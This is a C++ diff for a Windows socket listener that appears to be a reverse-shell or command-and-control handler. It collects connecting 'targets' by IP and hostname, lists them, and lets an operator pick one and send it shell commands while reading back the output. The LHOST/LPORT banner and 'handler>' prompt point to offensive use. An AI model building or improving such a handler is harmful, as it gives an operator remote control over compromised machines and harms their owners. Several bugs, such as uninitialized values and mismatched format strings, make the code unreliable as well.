@@ -1,10 +1,18 @@
 #include "server.hpp"
 
+const char* failed  = "\x1B[38;5;1m[-]\033[0m:";
+const char* warn    = "\x1B[38;5;3m[!]\033[0m:";
+const char* success = "\x1B[38;5;2m[+]\033[0m:";
 
-Server::Server(const char* port) { lport = port; }
 
 void Server::handler_print_help() {
-    printf("help... figure it out yourself!\n");
+    printf("\x1B[38;5;8m========================================================\033[0m\n");
+    printf("help\t\tShows this help\n");
+    printf("list\t\tLists connected clients\n");
+    printf("select\t\tSelects a client by its index\n");
+    printf("exit|quit\tStops current connections with a client\n");
+    printf("shutdown\tShuts server down\n");
+    printf("\x1B[38;5;8m========================================================\033[0m");
 }
 
 void Server::initialize() {
@@ -25,7 +33,8 @@ void Server::initialize() {
         printf("getaddrinfo failed with error: %d\n", iResult);
         WSACleanup();
         return;
-    } printf("got address info\n");
+    } 
+    printf("\nAddr Info Found | ");
 }
 
 
@@ -34,7 +43,7 @@ int Server::quit_gracefully() {
     {
         iResult = shutdown(conn, SD_SEND);
         if (iResult == SOCKET_ERROR) {
-            printf("shutdown failed with error: %d\n", WSAGetLastError());
+            printf("%s shutdown failed with error: %d\n", failed, WSAGetLastError());
             closesocket(conn);
             WSACleanup();
             return 0;
@@ -46,14 +55,23 @@ int Server::quit_gracefully() {
 
 void Server::create_socket() {
     // Create a SOCKET for connecting to server
-    ListenSocket = socket(AddrInfo->ai_family, AddrInfo->ai_socktype, AddrInfo->ai_protocol);
+    ListenSocket = WSASocketW(AddrInfo->ai_family, AddrInfo->ai_socktype, AddrInfo->ai_protocol, NULL, (unsigned)NULL, (unsigned)NULL);
     if (ListenSocket == INVALID_SOCKET) {
-        printf("socket failed with error: %ld\n", WSAGetLastError());
+        printf("%s socket creation failed with error: %ld\n", failed, WSAGetLastError());
         freeaddrinfo(AddrInfo);
         WSACleanup();
         return;
     }
-    printf("socket created\n");
+    int error_code;
+    if (setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&error_code, sizeof(error_code)) == SOCKET_ERROR)
+    {
+        printf("%s Error Setting TCP SOcket Options! Error: %s\n", failed, WSAGetLastError());
+        freeaddrinfo(AddrInfo);
+        WSACleanup();
+        return;
+    }
+    printf("Socket Created | ");
+    return;
 }
 
 
@@ -63,142 +81,252 @@ void Server::bind_socket() {
     listen(ListenSocket, SOMAXCONN);
     
     if (iResult == SOCKET_ERROR) {
-        printf("bind failed with error: %d\n", WSAGetLastError());
+        printf("%s socket binding failed with error: %d\n", failed, WSAGetLastError());
         std::this_thread::sleep_for(std::chrono::seconds(10));
         bind_socket();
     }
-    printf("socket bind\n");
+    freeaddrinfo(AddrInfo); // clear AddrInfo, dont need anymore
+    printf("Socket Bind | ");
     return;
 }
 
 
 void Server::accept_connections() {
-    printf("counting clients\n");
+    printf("Starting Handler Thread\n");
+    // ^ ok not really shut up
     for (auto c : all_connections) {
         closesocket(c);
         WSACleanup();
     }
-    std::string address;
-    printf("starting loop\n");
-    while (1) {
-        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    all_connections.clear();
+    all_addresses.clear();
+    
+    // get local ip
+    hostent* localHost = gethostbyname("");
+    char* localIP = inet_ntoa(*(struct in_addr*)*localHost->h_addr_list);
+    // target ip and hostname vars with same receiving buffer size
+    char TargetIP[BUFFER_SIZE];
+    char TargetHostname[BUFFER_SIZE];
+    // vector to hold array of index,ip,port,hostname
+    std::vector<LPCSTR> address;
+    // nice colors...
+    printf("========================================================================\n");
+    printf("Starting Listener -> \x1B[38;5;111mLHOST: \x1B[38;5;221m%s\033[0m | ", localIP);
+    printf(                     "\x1B[38;5;111mLPORT: \x1B[38;5;221m%s\033[0m\n\n", lport);
+    
+    // loop indefinateley
+    while (true) {
         try {
-            printf("accept\n");
-            ClientSocket = accept(ListenSocket, NULL, NULL);
-            memset(rdata, 0, sizeof(rdata));
-            iResult = recv(ClientSocket, rdata, BUFFER_SIZE, 0);
-            printf("recv\n");
-            address.append((LPCSTR)AddrInfo->ai_addr);
-            address.append((LPCSTR)rdata);
+            ClientSocket = accept(ListenSocket, NULL, NULL); // accept client sockets to server
+            recv(ClientSocket, TargetIP, BUFFER_SIZE, 0); // receive ip address
+            recv(ClientSocket, TargetHostname, BUFFER_SIZE, 0); // receive hostname
+            
+            address.push_back((LPCSTR)TargetIP); //ip - 0
+            address.push_back((LPCSTR)lport); //port - 1
+            address.push_back((LPCSTR)TargetHostname); //hostname - 2
         }
-        catch (const std::exception&) {
-            printf("Error accepting connections: %d", WSAGetLastError());
-            closesocket(ListenSocket);
-            WSACleanup();
+        catch (const std::exception&) { //if cant connect or client is offline
+            printf("%s Error accepting connections: %d", failed, WSAGetLastError()); 
+            WSACleanup(); //clean up, wait, then start over
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
             continue;
         }
-        printf("freeing addrinfo\n");
-        freeaddrinfo(AddrInfo);
+        // add client SOCKET and INFO to their vectors
         all_connections.push_back(ClientSocket);
-        printf("adding addr info to all_addresses\n");
         all_addresses.push_back(address);
-        printf("\nConnection has been established: %s\n", address);
+        printf("\n\n%s Connection has been established: %s (%s)\n", success, address[2], address[0]);
+        address.clear();
+        // reprint handler line because input was interrupted
+        printf("\n\x1B[38;5;159mhandler\x1B[38;2;231;72;86m> \033[0m");
+        
     }
-    closesocket(ListenSocket);
     return;
 }
 
+template <typename Out>
+void split_string(const std::string& s, char delim, Out result) {
+    std::istringstream iss(s);
+    std::string item;
+    while (std::getline(iss, item, delim)) {
+        *result++ = item;
+    }
+}
+
+std::vector<std::string> split(const std::string& s, char delim) {
+    std::vector<std::string> elems;
+    split_string(s, delim, std::back_inserter(elems));
+    return elems;
+}
 
 void Server::start_handler() {
-    char input[15];
-    unsigned short int index;
-    while (1) {
-        printf("handler> ");
-        //TODO fix input bugs
-        scanf_s("%s %*hd", &input, (unsigned)_countof(input), &index);
+    std::string input; // hold stdIn
+    std::vector<std::string> input_vec;
+    
+    while (true) {
+        // handler>_ (looks messy because of ANSI escape codes
+        printf("\n\x1B[38;5;159mhandler\x1B[38;2;231;72;86m> \033[0m");
+        std::getline(std::cin, input); // take string input
 
-        if (input == "clear" || input == "cls") {
-            ShellExecute(GetConsoleWindow(), L"open", L"cls", NULL, NULL, 0);
-        }
-        else if (input == "list") {
+        // using _stricmp because its not case specific and clean
+        if (_stricmp(input.c_str(), "clear") == 0 ||
+            _stricmp(input.c_str(), "cls") == 0) 
+        {   printf("\033[2J\033[1;1H");  } // another weird escape code thing
+
+        // list all connections
+        else if (_stricmp(input.c_str(), "list") == 0) {
             list_connections();
             continue;
         }
-        else if (input == "select") {
-            BOOL is_new_session = change_target(index);
-            if (is_new_session) {
+
+        // connect to new target
+        else if (input.find("select") != std::string::npos) {
+            unsigned short int index = 0;
+            // just automatically select the first connection for now
+            /*try {
+                input_vec.clear(); input_vec = split(input, ' ');
+                index = atoi(input_vec[1].c_str());
+            }
+            catch (const std::exception& e) {
+                printf("%s Please connect to client via index. Error: %s\n", warn, e);
+            }*/
+            if (change_target(index)) {
                 send_commands();
             } else { continue; }
         }
-        else if (input == "shutdown") {
+
+        // shutdown server
+        else if (_stricmp(input.c_str(), "shutdown") == 0) {
+            printf("server shutting down...\n");
+            quit_gracefully();
             closesocket(ClientSocket);
             WSACleanup();
             break;
         }
-        else if (input == "help") {
+        // print help menu
+        else if (_stricmp(input.c_str(), "help") == 0) {
             handler_print_help();
         }
+        // if nothing is entered just skip
         else if (input == "") {
             printf(""); //pass
         }
+        // this means the dumbass didnt enter da right thing smh
         else {
-            printf("Command not recognized\n");
+            printf("Command not recognized");
         }
     }
     return;
 }
 
-
 void Server::list_connections() {
-    const char* results = "";
     // list all connections
-    for (auto i : all_connections) {
+    int error_code;
+    int error_code_size = sizeof(error_code);
+    std::ostringstream results; std::string list;
+
+    
+    for (std::size_t  i = 0; i < all_connections.size(); i++) {
         try {
-            send(ClientSocket, " ", BUFFER_SIZE, 0);
-            recv(ClientSocket, rdata, BUFFER_SIZE, 0);
+            // check all elements in vector can communicate with the server
+            getsockopt(all_connections[i], SOL_SOCKET, SO_ERROR, (char*)&error_code, &error_code_size);
         }
         catch (...) {
-            all_connections.erase(all_connections.begin());
-            all_addresses.erase(all_addresses.begin());
+            // otherwise remove the disconnected ones so only the active will be printed for use
+            all_connections.erase(all_connections.begin() + (i - 1));
+            all_addresses.erase(all_addresses.begin() + (i - 1));
             continue;
         }
-        results = (LPSTR)i + '   ' + all_addresses[i][0] 
-            + '   ' + all_addresses[i][1] + '   ' + all_addresses[i][2] + '\n';
+        results << "|\x1B[38;5;8m=======================================================\033[0m\n"
+            << "| " << i << "\t | " << all_addresses[i][0] << "\t | "
+            << all_addresses[i][1] << "\t | " << all_addresses[i][2] << '\n';
+        list.append(results.str());
     }
-    printf("-------- Clients --------\n%s\n", results);
+    // just making it look pretty
+    printf("\n/\x1B[38;5;8m=======================================================\033[0m\n");
+    printf(              "| INDEX\t | IP-ADDRESS\t | PORT\t | HOSTNAME\n"                   );
+    printf(                              (LPCSTR)list.c_str()                               );
+    printf("\\\x1B[38;5;8m=======================================================\033[0m\n" );
+    return;
 }
 
 
 bool Server::change_target(unsigned short int target) {
-    if (!isdigit(target)) {
-        printf("Client index should be an integer\n");
+    try {
+        ClientSocket = all_connections[target];
+    }
+    catch (...) {
+        printf("%s Not a valid selection\n", warn);
         return false;
     }
-    else {
-        try {
-            ClientSocket = all_connections[target];
-        }
-        catch (...) {
-            printf("Not a valid selection\n");
-            return false;
-        }
-    }
-    printf("You are now connected to " + all_addresses[target][2] + '\n');
+    const char* mystr;
+    memset(&mystr, 0, std::string(all_addresses[target][2]).length());
+    printf("%s You are now connected to %s\n\n", success, all_addresses[target][2]);
+    //printf("==============================%s\n", mystr);
     return true;
 }
 
-/*
-void Server::read_command_output() {
 
-}
+int Server::send_commands() {
+    DWORD dwWrite, dwTotalWritten = 0;
+    BOOL bSuccess = FALSE;
+    bRunning = TRUE;
+    std::string usrinput;
+    while (bRunning)
+    {
+        // reveive
+        ZeroMemory(&rdata, sizeof(rdata));
+        dwSockRead = recv(ClientSocket, rdata, BUFFER_SIZE, 0);
+        if ((int)dwSockRead == SOCKET_ERROR)
+        {
+            printf("read error: %d", WSAGetLastError());
+            bRunning = FALSE;
+            return 0;
+        }
+        dwWrite, dwTotalWritten = 0;
+        bSuccess = FALSE;
 
-void Server::recvall() {
-
-}
-*/
-
-void Server::send_commands() {
-    send(ClientSocket, " ", BUFFER_SIZE, 0);
-    memset(rdata, 0, sizeof(rdata));
-    iResult = recv(ClientSocket, rdata, BUFFER_SIZE, 0);
+        // print to console
+        const HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+        if (hStdOut != INVALID_HANDLE_VALUE)
+        {
+            while (dwTotalWritten < dwSockRead)
+            {
+                bSuccess = WriteFile(hStdOut, rdata + dwTotalWritten, dwSockRead - dwTotalWritten,
+                    &dwWrite, NULL);
+                if (!bSuccess) {
+                    printf("could not print to console\n");
+                    break;
+                }
+                dwTotalWritten += dwWrite;
+            }
+        }
+        // send command
+        //dwWrite, dwTotalWritten = 0;
+        bSuccess = FALSE;
+        ZeroMemory(&inputUser, sizeof(inputUser));
+        fgets(inputUser, sizeof(inputUser), stdin);
+        strtok(inputUser, "\n");
+        DWORD sent = 0;
+        while (sent < BUFFER_SIZE && (int)sent != SOCKET_ERROR)
+        {
+            sent += send(ClientSocket, inputUser + sent, BUFFER_SIZE - sent, 0);
+            if ((int)sent == SOCKET_ERROR)
+            {
+                printf("socketerror\n");
+                break;
+            }
+        }
+        //while (dwTotalWritten < dwSockRead)
+        //{
+        //    bSuccess = WriteFile((HANDLE)ClientSocket, inputUser + dwTotalWritten, sizeof(inputUser) - dwTotalWritten,
+        //        &dwWrite, NULL);
+        //    if (!bSuccess) { break; }
+        //    dwTotalWritten += dwWrite;
+        //}
+    }
+    all_connections.erase(all_connections.begin());
+    all_addresses.erase(all_addresses.begin());
+    shutdown(ClientSocket, SD_BOTH);
+    closesocket(ClientSocket);
+    return 0;
 }
